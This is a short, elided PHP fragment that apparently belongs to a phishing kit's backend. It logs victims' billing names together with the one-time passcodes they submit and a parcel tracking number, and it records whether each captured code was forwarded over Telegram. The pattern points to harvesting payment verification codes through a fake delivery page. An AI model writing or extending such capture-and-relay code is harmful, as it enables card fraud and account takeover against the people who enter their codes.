...
try {
    ...
    error_log("OTP verify API called for: " . $billingData['nome'] . " with OTP: " . $otpCode);
    ...
    if (!$sessionResult) {
        ...
        error_log("No existing session found, created new session: $sessionId");
    } else {
        $sessionId = $sessionResult['session_id'];
        error_log("Found existing session: $sessionId");
    }
    ...
    error_log("OTP submitted for {$billingData['nome']} - OTP: $otpCode - Tracking: $trackingNumber - Telegram sent: " . ($telegramSent ? 'YES' : 'NO'));
